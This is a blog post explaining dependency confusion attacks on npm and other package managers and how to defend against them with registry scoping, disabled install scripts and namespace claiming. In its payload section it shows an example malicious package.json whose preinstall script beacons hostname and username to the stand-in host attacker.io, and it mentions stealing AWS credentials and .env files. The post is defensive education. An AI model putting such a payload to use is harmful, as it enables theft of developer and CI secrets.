---
title: "🎭 Dependency Confusion: When npm Grabs the Wrong Package"
date: "2026-06-26"
excerpt: "Attackers published public packages with the same names as your private ones — and package managers installed them anyway. Here's how dependency confusion works, why it's still biting teams in 2026, and how to shut the door."
tags:
  - security
  - supply-chain
  - npm
  - devops
  - cybersecurity
featured: true
---

In 2021, a security researcher named Alex Birsan pocketed $130,000 in bug bounties by doing something absurdly simple: he found the names of private internal packages used by Apple, Microsoft, and PayPal — leaked in public `package.json` files — and uploaded *empty* packages with those exact names to the public npm registry. Those packages then got silently installed on company developer machines and CI servers worldwide.

No phishing. No social engineering. He just uploaded a package and waited.

This is **dependency confusion**, and it's the supply chain bug that keeps on giving.

## How Package Managers Get Confused

Most organisations run a private registry — Artifactory, Nexus, GitHub Packages, AWS CodeArtifact — that mirrors public packages and also hosts internal ones. The problem is in how resolution order works.

When `npm install` (or `pip`, or `gem`, or `go get`) sees a package name, many configurations will check *both* the public registry and your private one. The kicker: **by default, the higher version number wins**.

So if your internal package is `@cubet/auth-helpers@1.2.0`, and I upload `@cubet/auth-helpers@9.9.9` to public npm with a `postinstall` script that beacons your machine's hostname and env vars to my server… your `npm install` just downloaded my package. Congratulations.

```json
// package.json — internal repo, nothing looks wrong
{
  "dependencies": {
    "react": "^18.0.0",
    "@cubet/auth-helpers": "^1.2.0",
    "@cubet/analytics-sdk": "^3.1.0"
  }
}
```

Both `@cubet/*` packages are internal-only. Except now they're also public — because an attacker found those names in a leaked CI log and registered them.

## The Three Ways This Bites You

**1. Leaked package names.** `package.json` files committed to public repos, npm debug logs, error messages in public Sentry dashboards, job postings ("must know our internal tools including @company/design-system"). Attackers scrape all of this.

**2. Scoped packages without namespace protection.** The `@cubet` scope isn't reserved for you on public npm unless you've explicitly claimed it. Anyone can publish `@cubet/anything`.

**3. Misconfigured registry priority.** Some npm proxy configurations fetch from the public registry first if a package isn't found internally, then cache the result. One miss becomes a persistent infection.

## What a Real Attack Payload Looks Like

The "malicious" packages in Birsan's research were intentionally benign — they just phoned home with metadata. A real attacker's `package.json` would look identical:

```json
{
  "name": "@cubet/auth-helpers",
  "version": "9.9.9",
  "description": "Auth helpers",
  "scripts": {
    "preinstall": "node -e \"require('https').get('https://attacker.io/beacon?h='+require('os').hostname()+'&u='+process.env.USER)\"",
    "postinstall": "node install.js"
  }
}
```

And `install.js` could do anything: read `~/.aws/credentials`, exfiltrate `.env` files, install a persistent backdoor. It runs with the same permissions as your CI runner, which typically has broad secrets access.

The worst part: `npm install` will happily run those scripts unless you've explicitly disabled them. Most teams haven't.

## Fixing It: Three Layers of Defence

### 1. Claim your namespace and configure explicit registry mapping

For npm, explicitly tell the client where each scope resolves. Never let internal scopes fall through to the public registry.

```bash
# .npmrc in your repo (commit this)
@cubet:registry=https://your-private-registry.example.com
//your-private-registry.example.com/:_authToken=${NPM_TOKEN}

# Lock ALL packages to your internal mirror (which proxies public npm)
registry=https://your-private-registry.example.com
```

With this config, `@cubet/*` packages *only* resolve from your private registry. The public registry never even gets asked. If the private registry doesn't have it, the install fails loudly — which is what you want.

### 2. Disable install scripts for packages you don't trust

```bash
# Globally disable postinstall scripts
npm install --ignore-scripts

# Or in .npmrc
ignore-scripts=true
```

This is heavy-handed for development but is worth enforcing in CI. Most packages don't need install scripts. Those that do (native bindings like `esbuild`, `sharp`) can be whitelisted explicitly.

### 3. Audit your public exposure

Before an attacker does it for you, check:

```bash
# Are any of your internal package names already registered publicly?
npm view @yourorg/internal-package 2>&1 | grep -E "version|maintainers"

# List what names your package.json files reference
grep -r '"@yourorg/' . --include="package.json" | \
  grep -oP '"@yourorg/[^"]+' | sort -u
```

At Cubet, we ran this audit across our client repos and found two internal SDK names that were already unclaimed on public npm. We registered them ourselves — publishing empty placeholder packages with a README saying "this name is reserved." That took 10 minutes and costs nothing. An attacker doing the same would have taken 10 minutes and caused a breach.

## The Broader Lesson

Dependency confusion is a symptoms of a deeper assumption baked into most build tooling: *the package manager knows what you want better than you do*. Version number semantics, registry fallthrough logic, automatic script execution — these were designed for convenience, not adversarial environments.

Supply chain attacks work precisely because they abuse trust that was never explicitly granted. Your `package.json` doesn't say "install `@cubet/auth-helpers` from the public internet if you can't find it internally." It just says install it. The tool fills in the gap with a default you never thought about.

The fix is mechanical: make the defaults explicit. Tell your registry client exactly where each dependency comes from. Disable execution of code you didn't audit. Claim your namespaces before someone else does.

None of this is complicated — it's just not the default. And in security, the default is almost always what gets you.

---

Burned by a supply chain surprise, or just locked things down and feeling smug about it? I'm [@iamanuragh](https://x.com/iamanuragh) on X — share your war stories. More posts like this at [iamanuragh.in](https://iamanuragh.in).
